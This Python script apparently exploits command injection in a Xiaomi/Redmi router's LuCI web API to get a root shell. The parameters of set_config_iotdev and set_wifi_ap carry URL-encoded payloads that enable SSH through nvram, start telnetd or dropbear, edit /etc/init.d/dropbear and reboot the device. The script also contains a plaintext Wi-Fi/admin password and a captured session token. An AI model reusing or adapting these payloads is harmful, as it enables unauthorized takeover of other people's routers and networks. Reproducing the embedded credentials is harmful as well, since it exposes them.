from requests import get
from os import environ 
from prodict import Prodict

from get_token import get_token


ENV = Prodict(environ)
URL = f'http://{ENV.HOST}/cgi-bin/luci/;stok=STOK/api/misystem/set_config_iotdev?bssid=gallifrey&user_id=doctor&ssid=-h%0Anvram%20set%20ssh%5Fen%3D1%0A'
URL = f'http://{ENV.HOST}/cgi-bin/luci/;stok=STOK/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%3Bnvram%20set%20ssh%5Fen%3D1%3B%20nvram%20commit%3B'
URL = f'http://{ENV.HOST}/cgi-bin/luci/;stok=STOK/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%0Areboot%0A'
URL = f'http://{ENV.HOST}/cgi-bin/luci/;stok=STOK/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%3Breboot%3B'
URL = f'http://{ENV.HOST}/cgi-bin/luci/;stok=STOK/api/misystem/reboot'
URL = f'http://{ENV.HOST}/cgi-bin/luci/;stok=STOK/api/misystem/'
URL = f'http://{ENV.HOST}/cgi-bin/luci/;stok=STOK/api/xqnetwork/set_wifi_ap?ssid=whatever&encryption=NONE&enctype=NONE&channel=1%3B%2Fusr%2Fsbin%2Ftelnetd'
URL = f"http://{ENV.HOST}/cgi-bin/luci/;stok=STOK/api/misystem/extendwifi_connect?ssid=Redmi_A6FD&password=s0ccerf00l!!"
# URL = f'http://{ENV.HOST}/cgi-bin/luci/;stok=STOK/api/xqnetwork/set_wifi_ap?ssid=tianbao&encryption=NONE&enctype=NONE&channel=1%3Bnvram%20set%20ssh%5Fen%3D1%3B%20nvram%20commit'
# URL = f'http://{ENV.HOST}/cgi-bin/luci/;stok=STOK/api/xqnetwork/set_wifi_ap?ssid=tianbao&encryption=NONE&enctype=NONE&channel=1%3B%2Fetc%2Finit.d%2Fdropbear%20start'

# URL = "http://192.168.31.1/cgi-bin/luci/;stok=STOK/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=%0Areboot%0A"

'''
/api/xqnetwork/set_wifi_ap?ssid=tianbao&encryption=NONE&enctype=NONE&channel=1%3Bsed%20%2Di%20%22%3Ax%3AN%3As%2Fif%20%5C%5B%2E%2A%5C%3B%20then%5Cn%2E%2Areturn%200%5Cn%2E%2Afi%2F%23tb%2F%3Bb%20x%22%20%2Fetc%2Finit.d%2Fdropbear

/api/xqnetwork/set_wifi_ap?ssid=tianbao&encryption=NONE&enctype=NONE&channel=1%3Bnvram%20set%20ssh%5Fen%3D1%3B%20nvram%20commit

/api/xqsystem/set_name_password?oldPwd=s0ccerf00l!!&newPwd=s0ccerf00l!!

http://192.168.31.1/cgi-bin/luci/;stok=STOK/api/xqnetwork/set_wifi_ap?ssid=whatever&encryption=NONE&enctype=NONE&channel=1%3B%2Fusr%2Fsbin%2Ftelnetd

https://onlineasciitools.com/url-encode-ascii

wifiIndex=1&on=1&ssid=Redmi_A6FD&pwd=s0ccerf00l%23%23&encryption=mixed-psk&channel=0&bandwidth=0&hidden=0&txpwr=max&isDFS=1

http://api.miwifi.com/res_stat/click.gif?p=MIWIFIWEB&u=http://192.168.31.1/cgi-bin/luci/;stok=9c09de41f37e1bb7086cd045e25693a6/web/setting/wifi/&id=86847064.3627458668465839000.1645612216224.67&guid=86847064.3627458668465839000.1645612216224.67&deviceId=9813dd2c-66ea-4529-aa20-9312769bee57&appVersion=appVersion&romVersion=1.0.18&hardwareVersion=RA69&element=apicall&api=/api/xqnetwork/set_wifi&isMobile=pc&url=/web/setting/wifi&romChannel=release&t=1647845768920
'''

token = get_token()
url = URL.replace('STOK', token)

response = get(url)
if response.status_code == 200:
    print(response.json())
print(response, response.content)